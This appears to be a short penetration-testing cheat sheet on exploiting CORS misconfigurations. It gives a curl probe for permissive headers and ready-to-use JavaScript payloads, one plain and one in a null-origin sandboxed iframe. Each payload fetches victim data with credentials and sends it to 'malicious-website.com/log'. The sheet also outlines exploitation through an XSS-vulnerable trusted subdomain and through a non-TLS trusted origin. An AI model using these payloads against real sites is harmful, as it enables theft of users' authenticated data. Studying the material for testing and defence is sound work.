
# CORS

Test for CORS vulnerabilities by looking for

``` http
access-control-allow-credentials: true
access-control-allow-credentials: true
```

``` http
curl -I -H "Origin: https://example.com" "https://vulnerable-endpoint.com"
```

Standard CORS exploit.

``` js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

If the Origin header only accepts null, use an iframe to satify the allowlist.

``` js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

If app A trusts app B origin, and app B is vulnerable to XSS, then app A is vulnerable to XSS.

* App A request:

``` http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

* App A response

``` http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

If app B (subdomain.vulnerable-website.com) is vulnerable to XSS, then you can exploit app A.

``` http
https://subdomain.vulnerable-website.com/?xss=<script>cors-exploit</script>
```

If app A trusts app B origin, and app B is not using TLS, then app A TLS is vulnerable to leaking unencrypted data.

1. The victim user makes any plain HTTP request.
2. The attacker injects a redirection to:
```http://trusted-subdomain.vulnerable-website.com```
3. The victim's browser follows the redirect.
4. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: ```https://vulnerable-website.com```
5. The victim's browser makes the CORS request, including the origin: ```http://trusted-subdomain.vulnerable-website.com```
6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

If an intranet site trusts an external origin that is vulnerable, then the intranet site can be vulnerable as well.
